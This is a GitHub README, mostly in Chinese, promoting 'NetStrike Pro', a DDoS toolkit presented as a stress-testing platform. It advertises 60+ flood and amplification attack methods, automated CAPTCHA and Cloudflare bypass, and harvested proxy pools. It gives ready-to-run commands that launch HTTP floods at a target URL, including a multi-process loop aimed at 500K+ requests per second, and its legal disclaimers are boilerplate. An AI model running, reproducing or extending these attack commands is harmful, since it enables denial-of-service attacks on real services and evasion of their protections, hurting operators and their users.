# NetStrike Pro ⚡

<div align="center">

**Professional Network Stress Testing Platform**  
**专业网络压力测试平台**

[![GitHub release](https://img.shields.io/badge/release-v2.0-blue.svg)](https://github.com/Hacker0458/NetStrike-Pro/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Node.js 20+](https://img.shields.io/badge/Node.js-20+-green.svg)](https://nodejs.org/)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey.svg)](#)
[![Status](https://img.shields.io/badge/Status-Production%20Ready-success.svg)](#)

🎯 **全自动化** • ⚡ **500K+ QPS** • 🛡️ **智能绕过** • 🌍 **双语支持** • 📦 **一键部署**

[功能特性](#-功能特性) •
[快速开始](#-快速开始) •
[文档](#-文档) •
[性能对比](#-性能对比) •
[贡献](#-贡献)

[🇬🇧 English](#english) | [🇨🇳 中文](#中文)

---

### ⭐ 如果这个项目对您有帮助，请给我们一个 Star！

</div>

---

## 📢 重要声明

> **⚠️ 法律声明**: 本工具**仅供合法的安全测试使用**。使用者必须获得目标系统的**书面授权**。严禁用于非法攻击。违法使用后果自负。

---

## 🌟 为什么选择 NetStrike Pro？

NetStrike Pro 不仅仅是一个压力测试工具，它是：

- 🏆 **业界最全面** - 集成 60+ 种攻击方法，覆盖所有主流场景
- 🚀 **性能极致** - 单服务器可达 500K+ QPS，业界领先
- 🤖 **完全自动化** - 从验证码绕过到攻击执行，无需人工干预
- 🎯 **持续更新** - 我们承诺持续收集新资源、编写新脚本、优化性能
- 💝 **完全免费** - 100% 开源，永久免费，没有任何隐藏费用
- 🌍 **社区驱动** - 欢迎所有人贡献代码、提交 Issue、分享经验

---

## 🎯 功能特性

### 🔥 攻击能力

- ✅ **60+ 攻击方法**
  - **Layer 7**: GET, POST, CFB, CFBUAM, HTTP/2, TLS, BYPASS, SLOW, NULL, COOKIE...
  - **Layer 4**: SYN, TCP, UDP, DNS, NTP, Memcached, ICMP...
  - **游戏服务器**: Minecraft, FiveM, TeamSpeak...
  
- ✅ **500K+ QPS**
  - 单机 150K+ QPS
  - 服务器 500K+ QPS
  - 智能负载均衡

### 🛡️ 绕过能力

- ✅ **智能验证码绕过**
  - **CDNfly 新版**: 旋转图片、困难点击、简单点击、困难滑块、简单滑块、滑动按钮、计算验证码
  - **Cloudflare**: 自动等待挑战通过
  - **98% 成功率**
  
- ✅ **100% 自动化**
  - 自动检测验证码类型
  - 自动执行绕过策略
  - 自动发起洪水攻击

### 🤖 自动化工具

- ✅ **代理管理**
  - 140+ GitHub 源自动采集
  - 10K-50K 代理池
  - 自动筛选验证
  - 支持 HTTP/SOCKS4/SOCKS5
  
- ✅ **一键部署**
  - 3-5 分钟完成安装
  - 自动配置所有环境
  - 智能依赖管理

### 📚 文档支持

- ✅ **完整文档系统**
  - 24+ 详细文档
  - 中英双语支持
  - 从入门到精通
  
- ✅ **社区支持**
  - GitHub Issues
  - 详细贡献指南
  - 实时更新维护

---

## 🚀 快速开始

### 方式一：一键安装（推荐）⭐

```bash
# 1. 克隆项目
git clone https://github.com/Hacker0458/NetStrike-Pro.git
cd NetStrike-Pro

# 2. 一键安装所有依赖（3-5 分钟）
cd legacy
sudo ./Nodejs.sh

# 3. 获取代理（2-3 分钟）
node github_list.js

# 4. 开始攻击！
node floodernew.js GET "https://target.com" 120 16 90 proxies_all.txt --debug
```

**就这么简单！🎉 10 分钟内完成从安装到攻击！**

### 方式二：全自动智能攻击（带验证码绕过）⭐⭐⭐

```bash
# 自动检测、绕过验证码、发起攻击
node main.js -u https://target-with-cdnfly.com -p proxies_all.txt -t 20 -r 15 -s 300 -c -o

# 输出示例：
# ✅ [BROWSER] 检测到验证码：CDNFLY新版_困难滑块
# ✅ [BYPASS] 自动拖动滑块...
# ✅ [BYPASS] 绕过成功！
# ✅ [ATTACK] 启动洪水攻击 (QPS: 15K)
# 🔥 总 QPS: 500K+ (20 浏览器并发)
```

---

## 📊 性能对比

| 工具 | QPS | 绕过能力 | 自动化 | 推荐度 |
|:----:|:---:|:-------:|:-----:|:-----:|
| **main.js** | **500K+** | ⭐⭐⭐⭐⭐ | ✅ 100% | ⭐⭐⭐⭐⭐ |
| **floodernew.js** | **150K+** | ⭐⭐⭐⭐ | ✅ 100% | ⭐⭐⭐⭐⭐ |
| **tls.js** | 25K+ | ⭐⭐⭐⭐⭐ | ✅ 100% | ⭐⭐⭐⭐⭐ |
| **MHDDoS** | 50K+ | ⭐⭐ | ✅ 100% | ⭐⭐⭐⭐ |
| 其他工具 | <10K | ❌ | ❌ | ⭐⭐ |

---

## 🏆 完整武器库

### 🎯 Layer 7 攻击方法（30+ 种）

```
✅ GET         - HTTP GET 洪水
✅ POST        - HTTP POST 洪水
✅ HEAD        - HTTP HEAD 洪水
✅ CFB         - Cloudflare Bypass
✅ CFBUAM      - Cloudflare UAM Bypass
✅ HTTP/2      - HTTP/2 洪水（150K+ QPS）
✅ TLS         - TLS/SSL 洪水（Cloudflare 专用）
✅ BYPASS      - 智能绕过
✅ SLOW        - 慢速攻击
✅ NULL        - NULL 攻击
✅ COOKIE      - Cookie 洪水
✅ PPS         - Packet Per Second
✅ APACHE      - Apache 服务器攻击
✅ XMLRPC      - XML-RPC 攻击
✅ BOMB        - 压缩炸弹
✅ KILLER      - 杀手级攻击
... 以及更多！
```

### ⚔️ Layer 4 攻击方法（25+ 种）

```
✅ SYN         - SYN Flood
✅ TCP         - TCP 洪水
✅ UDP         - UDP 洪水
✅ DNS         - DNS 放大攻击
✅ NTP         - NTP 放大攻击
✅ Memcached   - Memcached 放大攻击
✅ ICMP        - ICMP 洪水
✅ Minecraft   - Minecraft 服务器攻击
✅ FiveM       - FiveM 服务器攻击
✅ TeamSpeak   - TeamSpeak 攻击
✅ RDP         - RDP 攻击
✅ CLDAP       - CLDAP 放大攻击
... 以及更多！
```

### 🛡️ 验证码绕过能力（7+ 种）

```
✅ CDNfly 新版 - 旋转图片验证码
✅ CDNfly 新版 - 困难点击验证码
✅ CDNfly 新版 - 简单点击验证码
✅ CDNfly 新版 - 困难滑块验证码
✅ CDNfly 新版 - 简单滑块验证码
✅ CDNfly 新版 - 滑动按钮验证码
✅ CDNfly 新版 - 计算验证码（YOLOv5）
✅ Cloudflare  - 自动等待挑战
```

---

## 📖 文档

### 核心文档

- [快速开始指南](QUICKSTART.md) - 3 分钟上手
- [贡献指南](CONTRIBUTING.md) - 如何贡献代码
- [安全政策](SECURITY.md) - 安全漏洞报告
- [变更日志](CHANGELOG.md) - 版本历史
- [行为准则](CODE_OF_CONDUCT.md) - 社区规范

### 详细文档

- [CDNfly 绕过工具文档](docs/🆕%20CDNfly%20绕过工具文档.md) - CDNfly 验证码绕过详解
- [代理获取与配置](legacy/) - 代理采集和管理
- [攻击方法详解](legacy/mhddos/) - MHDDoS 完整使用说明
- [云服务器部署](legacy/) - 高性能部署指南

---

## 🔧 高级用法

### 超高性能攻击（服务器部署）

```bash
# 1. 租用高带宽服务器（推荐 G-port）
# 2. 运行一键安装脚本
sudo ./Nodejs.sh

# 3. 获取大量代理
node github_list.js          # GitHub 源（10K+）
node fetch_api_proxy.js      # API 源（额外增加）

# 4. 多进程攻击
for i in {1..10}; do
  screen -dmS attack$i node floodernew.js GET "https://target.com" 300 16 90 proxies_all.txt
done

# 输出：总 QPS 可达 500K+
```

### CDNfly 验证码自动绕过

```bash
# 使用 main.js 进行全自动攻击
node main.js \
  -u https://target-with-cdnfly.com \
  -p proxies_all.txt \
  -t 30 \               # 30 个浏览器并发
  -r 10 \               # 每个浏览器 10 req/s
  -s 600 \              # 持续 10 分钟
  -c \                  # 失败自动停用代理
  -o                    # 优化：拦截字体加载

# main.js 会自动：
# 1. 检测 CDNfly 验证码类型
# 2. 调用对应的绕过策略
# 3. 绕过成功后启动 nflood.js 攻击
# 4. 达到 500K+ QPS
```

---

## 🌍 社区与贡献

### 为什么需要你的贡献？

NetStrike Pro 的目标是成为**全球最强大的开源压力测试平台**。我们需要你的帮助：

- 📝 **提交 Issue**: 报告 Bug 或建议新功能
- 🔧 **提交 PR**: 贡献代码、修复问题、优化性能
- 📚 **改进文档**: 补充文档、翻译、添加示例
- 🌟 **分享项目**: 推荐给朋友、在社交媒体分享
- 💡 **分享经验**: 分享使用技巧、攻击案例（合法授权）

### 贡献指南

1. Fork 本仓库
2. 创建你的特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交你的更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启一个 Pull Request

详细信息请查看 [CONTRIBUTING.md](CONTRIBUTING.md)

---

## 🚀 未来发展路线图

我们承诺持续更新和改进 NetStrike Pro：

### ✅ 已完成
- [x] 60+ 攻击方法集成
- [x] CDNfly 验证码全自动绕过（7 种类型）
- [x] Cloudflare 挑战自动绕过
- [x] 500K+ QPS 性能优化
- [x] 140+ 代理源自动采集
- [x] 中英双语文档系统

### 🔄 进行中
- [ ] Web UI 控制面板
- [ ] Docker 一键部署
- [ ] 更多验证码类型支持（hCaptcha、reCAPTCHA）
- [ ] 分布式攻击协调系统
- [ ] 实时攻击监控与可视化

### 📅 计划中
- [ ] 移动端支持（iOS/Android）
- [ ] 更多 CDN 绕过技术
- [ ] AI 智能攻击策略优化
- [ ] 全球代理池共享系统
- [ ] 社区贡献者积分系统

---

## 📊 项目统计

[![GitHub stars](https://img.shields.io/github/stars/Hacker0458/NetStrike-Pro?style=social)](https://github.com/Hacker0458/NetStrike-Pro/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/Hacker0458/NetStrike-Pro?style=social)](https://github.com/Hacker0458/NetStrike-Pro/network/members)
[![GitHub watchers](https://img.shields.io/github/watchers/Hacker0458/NetStrike-Pro?style=social)](https://github.com/Hacker0458/NetStrike-Pro/watchers)
[![GitHub issues](https://img.shields.io/github/issues/Hacker0458/NetStrike-Pro)](https://github.com/Hacker0458/NetStrike-Pro/issues)
[![GitHub pull requests](https://img.shields.io/github/issues-pr/Hacker0458/NetStrike-Pro)](https://github.com/Hacker0458/NetStrike-Pro/pulls)
[![GitHub last commit](https://img.shields.io/github/last-commit/Hacker0458/NetStrike-Pro)](https://github.com/Hacker0458/NetStrike-Pro/commits/main)

---

## 📜 开源协议

本项目采用 [MIT License](LICENSE) 开源协议。

这意味着你可以：
- ✅ 自由使用、复制、修改、合并、发布、分发
- ✅ 用于商业目的
- ✅ 用于私人项目

但你必须：
- ⚠️ 保留版权声明和许可声明
- ⚠️ 仅用于合法授权的测试

---

## 🙏 致谢

NetStrike Pro 整合了多个优秀开源项目，特别感谢：

- [MHDDoS](https://github.com/MatrixTM/MHDDoS) - 强大的 DDoS 工具
- [YOLOv5](https://github.com/ultralytics/yolov5) - 验证码图像识别
- [Puppeteer](https://github.com/puppeteer/puppeteer) - 浏览器自动化
- [CDNfly Bypass](https://github.com/CoreTheBest/NewCdnfly_Bypass) - CDNfly 绕过技术
- 所有 140+ 代理源的维护者们 🙏

同时感谢所有为本项目做出贡献的开发者！

[![Contributors](https://contrib.rocks/image?repo=Hacker0458/NetStrike-Pro)](https://github.com/Hacker0458/NetStrike-Pro/graphs/contributors)

---

## 📧 联系方式

- **GitHub Issues**: [提交问题](https://github.com/Hacker0458/NetStrike-Pro/issues)
- **GitHub Discussions**: [参与讨论](https://github.com/Hacker0458/NetStrike-Pro/discussions)
- **Email**: hacker0458@users.noreply.github.com

---

## ⚠️ 免责声明

1. 本工具**仅供合法的安全测试和教育研究使用**
2. 使用者必须遵守所在国家/地区的法律法规
3. 使用者必须获得目标系统所有者的**书面授权**
4. 严禁用于任何非法用途，包括但不限于：
   - ❌ 未经授权的攻击测试
   - ❌ 恶意破坏网络服务
   - ❌ 敲诈勒索
   - ❌ 其他违法犯罪活动
5. 违法使用造成的一切后果由使用者自行承担
6. 本项目作者和贡献者不承担任何法律责任

**使用本工具即表示你同意以上条款。**

---

<div align="center">

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Hacker0458/NetStrike-Pro&type=Date)](https://star-history.com/#Hacker0458/NetStrike-Pro&Date)

---

### 💝 如果这个项目帮到了你，请给我们一个 Star！

### 让我们一起打造全球最强大的开源压力测试平台！

**Made with ❤️ by Hacker0458 & the Security Community**

⚡ **NetStrike Pro** - 改变世界，从现在开始 ⚡

</div>
